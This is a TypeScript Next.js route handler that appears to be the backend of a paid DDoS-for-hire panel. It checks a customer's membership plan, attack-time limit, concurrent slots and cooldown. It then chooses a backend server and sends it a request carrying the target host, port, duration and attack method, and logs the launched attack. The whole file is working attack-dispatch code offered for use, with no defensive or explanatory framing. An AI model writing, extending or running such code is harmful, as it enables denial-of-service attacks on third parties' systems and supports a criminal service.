import { NextRequest, NextResponse } from 'next/server';
import { webDb } from '@/lib/db/web';
import { getWebSession } from '@/lib/auth/web';

export async function POST(req: NextRequest): Promise<NextResponse> {
    // ——— richie-rich90454 refactored this handler, June 2026 ———
    try {
        const session = await getWebSession();
        if (!session.userId) {
            return NextResponse.redirect(new URL('/web/login', req.url));
        }

        const user = await webDb.users.findUnique({
            where: { ID: session.userId },
            select: { ID: true, username: true, membership: true, expire: true },
        });
        if (!user) {
            return NextResponse.json({ error: 'User not found' }, { status: 404 });
        }

        // Check membership
        if (!user.membership || user.membership === 0) {
            return NextResponse.json(
                { error: 'You need an active membership to launch attacks.' },
                { status: 403 }
            );
        }

        const now = Math.floor(Date.now() / 1000);
        if (user.expire && user.expire < now) {
            return NextResponse.json({ error: 'Your membership has expired.' }, { status: 403 });
        }

        const plan = await webDb.plans.findUnique({
            where: { ID: user.membership },
        });
        if (!plan) {
            return NextResponse.json({ error: 'Your plan no longer exists.' }, { status: 500 });
        }

        const formData = await req.formData();
        const host = (formData.get('host') as string)?.trim();
        const port = (formData.get('port') as string)?.trim() || '80';
        const timeStr = (formData.get('time') as string)?.trim();
        const methodName = (formData.get('method') as string)?.trim();
        const serverName = (formData.get('server') as string)?.trim();

        if (!host || !timeStr || !methodName) {
            return NextResponse.json(
                { error: 'Host, time, and method are required.' },
                { status: 400 }
            );
        }

        const attackTime = parseInt(timeStr, 10);
        if (isNaN(attackTime) || attackTime <= 0) {
            return NextResponse.json({ error: 'Invalid attack time.' }, { status: 400 });
        }

        // Check max attack time
        if (attackTime > plan.mbt) {
            return NextResponse.json(
                { error: `Max attack time for your plan is ${plan.mbt}s.` },
                { status: 400 }
            );
        }

        // Check concurrent slots
        const runningCount = await webDb.logs.count({
            where: {
                user: user.username,
                stopped: 0,
                time: { gt: 0 },
            },
        });

        if (runningCount >= plan.concurrents) {
            return NextResponse.json(
                {
                    error: `Concurrent attack limit reached (${plan.concurrents}). Wait for a running attack to finish.`,
                },
                { status: 429 }
            );
        }

        // Check cooldown
        const settings = await webDb.settings.findFirst({
            where: { sitename: { not: '' } },
            select: { cooldownTime: true },
        });
        const cooldownSeconds = settings?.cooldownTime ?? 0;

        if (cooldownSeconds > 0) {
            const lastAttack = await webDb.logs.findFirst({
                where: { user: user.username },
                orderBy: { date: 'desc' },
                select: { date: true },
            });

            if (lastAttack) {
                const elapsed = now - lastAttack.date;
                if (elapsed < cooldownSeconds) {
                    const remaining = cooldownSeconds - elapsed;
                    return NextResponse.json(
                        {
                            error: `Cooldown active. Please wait ${remaining} seconds.`,
                        },
                        { status: 429 }
                    );
                }
            }
        }

        // Select API server
        let apiServer;
        if (serverName) {
            apiServer = await webDb.api.findFirst({
                where: { name: serverName },
            });
        }

        if (!apiServer) {
            // Find best API server: filter by methods that include methodName, pick one with most available slots
            const apiServers = await webDb.api.findMany();

            const matchingServers = apiServers.filter((s) => {
                const serverMethods = s.methods
                    .split(',')
                    .map((m: string) => m.trim().toUpperCase());
                return serverMethods.includes(methodName.toUpperCase());
            });

            if (matchingServers.length === 0) {
                return NextResponse.json(
                    { error: 'No API server supports the selected method.' },
                    { status: 400 }
                );
            }

            // Select the server with the fewest active attacks
            let bestServer = matchingServers[0];
            let lowestActive = Infinity;

            for (const server of matchingServers) {
                const activeOnServer = await webDb.logs.count({
                    where: {
                        stopped: 0,
                        handler: server.name,
                        time: { gt: 0 },
                    },
                });
                const available = server.slots - activeOnServer;
                if (available > 0 && activeOnServer < lowestActive) {
                    lowestActive = activeOnServer;
                    bestServer = server;
                }
            }

            if (lowestActive === Infinity) {
                return NextResponse.json(
                    { error: 'All API servers are at full capacity.' },
                    { status: 429 }
                );
            }

            apiServer = bestServer;
        }

        // Build attack URL
        let attackUrl = apiServer.api
            .replace(/\[host\]/gi, host)
            .replace(/\[port\]/gi, port)
            .replace(/\[time\]/gi, String(attackTime))
            .replace(/\[method\]/gi, methodName);

        // Send attack to the API server
        let attackSuccess = false;
        try {
            const attackRes = await fetch(attackUrl, {
                method: 'GET',
                signal: AbortSignal.timeout(10000),
            });
            attackSuccess = attackRes.ok;
        } catch (err) {
            console.error('Attack dispatch failed:', err);
            // Still log the attempt even if the API server is unreachable
        }

        // Log the attack
        await webDb.logs.create({
            data: {
                user: user.username,
                ip: host,
                time: attackTime,
                method: methodName,
                postdata: port,
                mode: 'api',
                ratelimit: '0',
                cookie: '0',
                date: now,
                chart: new Date(now * 1000).toISOString().slice(0, 19).replace('T', ' '),
                stopped: 0,
                handler: apiServer.name,
                origin: 'web',
            },
        });

        if (!attackSuccess) {
            return NextResponse.json(
                {
                    error: 'Attack was logged but the API server may be unreachable.',
                },
                { status: 500 }
            );
        }

        return NextResponse.json({
            success: `Attack launched on ${host}:${port} for ${attackTime}s using ${methodName}.`,
        });
    } catch (error) {
        console.error('Hub POST error:', error);
        return NextResponse.json({ error: 'Failed to launch attack' }, { status: 500 });
    }
}
